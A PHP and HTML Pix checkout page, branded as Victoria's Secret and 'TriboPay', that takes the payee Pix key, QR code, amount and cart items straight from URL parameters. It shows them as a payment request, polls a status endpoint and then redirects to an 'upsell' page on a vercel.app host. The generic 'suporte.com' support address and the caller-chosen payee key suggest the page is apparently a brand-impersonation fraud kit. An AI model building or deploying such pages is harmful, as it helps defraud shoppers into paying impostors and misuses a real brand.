<?php
// Recebe os dados via GET
$transacao = isset($_GET['transacao']) ? $_GET['transacao'] : uniqid();
$nome       = isset($_GET['nome']) ? $_GET['nome'] : 'Cliente';
$email      = isset($_GET['email']) ? $_GET['email'] : '';
$telefone   = isset($_GET['telefone']) ? $_GET['telefone'] : '';
$chavePix   = isset($_GET['pix']) ? $_GET['pix'] : '';
$qrcode     = isset($_GET['qrcode']) ? $_GET['qrcode'] : '';
$valor      = isset($_GET['valor']) ? $_GET['valor'] : '0,00';
$hash       = isset($_GET['hash']) ? $_GET['hash'] : $transacao;

if (!$transacao && $hash) {
    $transacao = $hash;
}

// Receber produtos via JSON
$produtos_json = isset($_GET['produtos']) ? urldecode($_GET['produtos']) : '[]';
$produtos = json_decode($produtos_json, true);

// Calcular total baseado nos produtos
$total_produtos = 0;
if (is_array($produtos) && !empty($produtos)) {
    foreach ($produtos as $produto) {
        $total_produtos += ($produto['preco'] * $produto['quantidade']);
    }
}

// Se não veio produtos, usar valor do parâmetro
if ($total_produtos == 0 && $valor != '0,00') {
    $total_produtos = (float) str_replace(',', '.', str_replace('.', '', $valor));
}

$valor_formatado = number_format($total_produtos, 2, ',', '.');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pague o Pix</title>
  <style>
    * {
      margin: 2;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, Helvetica, sans-serif;
    }

    body {
      background-color: #f4f4f4;
      display: flex;
      justify-content: center;
      padding: 10px;
      min-height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 400px;
    }

    .card {
      background: #fff;
      border-radius: 12px;
      padding: 18px;
      margin-bottom: 15px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
      word-wrap: break-word;
    }

    h1 {
      color: #f53d5c;
      font-size: 22px;
      text-align: center;
      margin-bottom: 10px;
    }

    h2 {
      font-size: 18px;
      margin-bottom: 10px;
      text-align: center;
    }

    .transacao {
      text-align: center;
      margin-bottom: 12px;
      font-size: 14px;
      color: #333;
      word-break: break-all;
    }

    .status {
      background: #f53d5c;
      color: #fff;
      padding: 10px;
      border-radius: 8px;
      margin: 15px 0;
      font-weight: bold;
      text-align: center;
      font-size: 14px;
    }

    .qrcode {
      display: flex;
      justify-content: center;
      margin: 15px 0;
    }

    .qrcode img {
      max-width: 80%;
      height: auto;
    }

    .pix-input {
      display: flex;
      margin: 10px 0;
      width: 100%;
    }

    .pix-input input {
      flex: 1;
      padding: 8px;
      border: 1px solid #ccc;
      border-radius: 8px 0 0 8px;
      font-size: 14px;
    }

    .pix-input button {
      padding: 8px 12px;
      border: none;
      background: #eee;
      cursor: pointer;
      border-radius: 0 8px 8px 0;
      font-size: 14px;
    }

    .confirm-btn {
      margin-top: 15px;
      background: #f53d5c;
      color: #fff;
      border: none;
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }

    .confirm-btn:hover {
      background: #e69500;
    }

    .item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 14px;
      word-break: break-word;
      margin-bottom: 10px;
      padding-bottom: 10px;
      border-bottom: 1px solid #eee;
    }

    .item:last-child {
      border-bottom: none;
      margin-bottom: 0;
      padding-bottom: 0;
    }

    .item-img {
      width: 50px;
      height: 50px;
      border-radius: 6px;
      object-fit: cover;
      margin-right: 10px;
    }

    .item-info {
      flex: 1;
    }

    .item-name {
      margin: 0;
      font-size: 14px;
      color: #333;
      line-height: 1.3;
    }

    .item-details {
      margin: 0;
      font-size: 13px;
      color: #666;
    }

    .item-price {
      font-size: 14px;
      color: #f53d5c;
      font-weight: bold;
      white-space: nowrap;
      margin-left: 10px;
    }

    .total {
      font-weight: bold;
      text-align: right;
      margin-top: 15px;
      font-size: 16px;
      padding-top: 10px;
      border-top: 2px solid #eee;
    }

    .dados p {
      font-size: 14px;
      margin: 5px 0;
      word-break: break-word;
    }

    .suporte, .rodape {
      font-size: 13px;
      color: #444;
    }

    .rodape {
      text-align: center;
      font-size: 12px;
      margin-top: 10px;
      word-break: break-word;
    }

    .rodape a {
      color: #007bff;
      text-decoration: none;
    }

    .empty-cart {
      text-align: center;
      color: #999;
      padding: 20px;
      font-style: italic;
    }

    /* Responsivo para telas pequenas */
    @media (max-width: 360px) {
      .card {
        padding: 14px;
      }
      h1 { font-size: 20px; }
      h2 { font-size: 16px; }
      .status { font-size: 13px; padding: 8px; }
      .pix-input input, .pix-input button { font-size: 13px; padding: 6px; }
      .confirm-btn { font-size: 15px; padding: 10px; }
      .total { font-size: 15px; }
      .item-img {
        width: 40px;
        height: 40px;
      }
    }
  </style>
</head>
<body>
  <div class="container">

    <!-- Cabeçalho e instruções -->
    <div class="card">
      <h1>Pague o Pix</h1>
      <div class="transacao">Transação: <strong><?php echo htmlspecialchars($transacao); ?></strong></div>

      <h2><?php echo htmlspecialchars($nome); ?>,</h2>
      <p><strong>Siga os passos abaixo para pagar:</strong></p>
      <p>(1) Copie a chave PIX abaixo</p>
      <p>(2) Abra o aplicativo do seu banco e entre na opção PIX</p>
      <p>(3) Escolha a opção Pagar =&gt; Pix copia e cola</p>
      <p>(4) Depois, confirme o pagamento.</p>

      <div class="status" id="statusPagamento">Aguardando pagamento ⏳</div>

      <!-- QR Code -->
      <div class="qrcode">
        <?php if ($qrcode): ?>
          <img src="<?php echo htmlspecialchars($qrcode); ?>" alt="QR Code">
        <?php else: ?>
          <p style="color:#999;">QR Code não disponível</p>
        <?php endif; ?>
      </div>

      <p>Copie a chave pix</p>

      <!-- Chave PIX -->
      <div class="pix-input">
        <input type="text" id="pix-chave" value="<?php echo htmlspecialchars($chavePix); ?>" readonly>
        <button onclick="copiarChave()">Copiar</button>
      </div>

      <button class="confirm-btn" onclick="copiarChave()">✔ Confirmar Pagamento</button>
    </div>

    <!-- Itens da compra -->
    <div class="card">
      <h3>Itens da sua compra</h3>
      
      <?php if (is_array($produtos) && !empty($produtos)): ?>
        <?php foreach ($produtos as $produto): ?>
          <div class="item">
            <img src="<?php echo isset($produto['imagem']) ? htmlspecialchars($produto['imagem']) : 'produto.png'; ?>" 
                 alt="<?php echo htmlspecialchars($produto['nome']); ?>" 
                 class="item-img"
                 onerror="this.src='produto.png'">
            
            <div class="item-info">
              <p class="item-name"><?php echo htmlspecialchars($produto['nome']); ?></p>
              <p class="item-details">Qtd: <?php echo htmlspecialchars($produto['quantidade']); ?></p>
            </div>
            
            <div class="item-price">
              R$ <?php echo number_format($produto['preco'] * $produto['quantidade'], 2, ',', '.'); ?>
            </div>
          </div>
        <?php endforeach; ?>
      <?php else: ?>
        <div class="empty-cart">
          Nenhum produto no carrinho
        </div>
      <?php endif; ?>

      <!-- Total -->
      <div class="total">
        <span>Total: R$ <?php echo $valor_formatado; ?></span>
      </div>
    </div>

    <!-- Dados do cliente -->
    <div class="card dados">
      <h3>Seus dados</h3>
      <p><strong>Nome:</strong> <?php echo htmlspecialchars($nome); ?></p>
      <?php if ($email): ?><p><strong>E-mail:</strong> <?php echo htmlspecialchars($email); ?></p><?php endif; ?>
      <?php if ($telefone): ?><p><strong>Telefone:</strong> <?php echo htmlspecialchars($telefone); ?></p><?php endif; ?>
    </div>

    <!-- Suporte -->
    <div class="card suporte">
      <h3>Suporte ao Cliente Victoria's Secret</h3>
      <p>Teve dúvidas com a sua compra? Entre em contato conosco.</p>
      <p><strong>E-mail:</strong> victoriassecret@suporte.com</p>
    </div>

    <!-- Rodapé -->
    <div class="rodape">
      TriboPay está processando este pedido à serviço de <strong>Victoria's Secret</strong>.<br>
      Ao prosseguir você está concordando com os <a href="#">termos de uso</a>.
    </div>
  </div>

  <script>
    function copiarChave() {
      const input = document.getElementById("pix-chave");
      input.select();
      input.setSelectionRange(0, 99999);
      document.execCommand("copy");
      alert("Chave PIX copiada!");
    }

    const DEFAULT_API_BASE = '/checkout/';
    const API_BASE_OVERRIDE = (window.CHECKOUT_API_BASE_URL || document.body?.dataset?.apiBase || '').trim();

    function buildApiUrl(path) {
      const base = API_BASE_OVERRIDE !== '' ? API_BASE_OVERRIDE : DEFAULT_API_BASE;
      const normalizedBase = base.endsWith('/') ? base : base + '/';
      const sanitizedPath = path.replace(/^\/+/, '');

      if (/^https?:\/\//i.test(normalizedBase)) {
        return normalizedBase + sanitizedPath;
      }

      if (normalizedBase.startsWith('/')) {
        return normalizedBase + sanitizedPath;
      }

      return '/' + normalizedBase + sanitizedPath;
    }

    // Verificação automática do pagamento
    setInterval(async () => {
      try {
        const verificaUrl = buildApiUrl("verifica.php?id=<?php echo urlencode($transacao); ?>");
        const res = await fetch(verificaUrl);
        const data = await res.json();
        if (data.status === "pago") {
          document.getElementById("statusPagamento").innerText = "✅ Pagamento Confirmado!";
          setTimeout(() => {
            window.location.href = "https://tikt-ten.vercel.app/up1"; // redireciona para upsell
          }, 2000);
        }
      } catch (e) {
        console.error("Erro ao verificar pagamento", e);
      }
    }, 5000);
  </script>
</body>
</html>
